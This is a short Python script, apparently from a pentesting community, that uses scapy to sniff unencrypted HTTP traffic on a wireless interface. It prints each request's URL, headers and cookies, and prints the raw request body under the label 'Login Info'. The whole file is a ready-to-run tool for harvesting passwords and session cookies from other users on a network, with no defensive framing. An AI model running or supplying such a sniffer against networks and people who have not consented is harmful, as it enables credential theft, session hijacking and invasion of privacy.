#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Nov 19 05:58:40 2022

@author: dr404 (Myanmar Pentester Community)
"""


import scapy.all as scapy


# Need to install scapy_http module (pip3 install scapy_http)
from scapy.layers import http 
from termcolor import colored


def banner(name):
    return print(name+"\n\n")

    
    
   
          
name = """
 ================================================================
#    ____      __                             __                #
#   /  _/___  / /_ ___   ____ ____ ___  ___  / /_ ___   ____    #
#  _/ / / _ \/ __// -_) / __// __// -_)/ _ \/ __// _ \ / __/    #
# /___//_//_/\__/ \__/ /_/   \__/ \__// .__/\__/ \___//_/       #
#                                    /_/                        #
#                                  by Dr.404                    # 
#                                  https://github.com/dr-404    #               
#                                  Myanmar Pentester Community  #
#                                                               #
 ================================================================            
"""           



def yellow(string):
    return colored(string,'yellow')
    
    
    
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    
def process_sniffed_packet(packet):
    
    
    if packet.haslayer(http.HTTPRequest):
        
        
        if packet.haslayer(scapy.Raw):
            
            #print(packet.show())
            
            method = packet.Method.decode('UTF-8')
            
            version = packet.Http_Version.decode('UTF-8')
            
            uAgent = packet.User_Agent.decode('UTF-8')
            
            content = packet.Content_Type.decode('UTF-8')
            
            url = (packet.Host + packet.Path).decode('UTF-8')
            
            referer = packet.Referer.decode('UTF-8')
            
            cookie = str(packet.Cookie)
            
            login = packet[scapy.Raw].load.decode("UTF-8")
        
            print("Request MEthod\t:\t" + yellow(method))
            print("HTTP Version\t:\t" + yellow(version))
            print("User-Agent\t:\t" + yellow(uAgent))
            print("Content-Type\t:\t" + yellow(content))
            print("Requested URL\t:\t" + yellow(url))
            print("Referer\t\t:\t" + yellow(referer))
            print("Cookie\t\t:\t" + yellow(cookie))
            
            print("Login Info\t:\t"+yellow(login))

banner(name)
sniff('wlan0')    
    
    
    
    
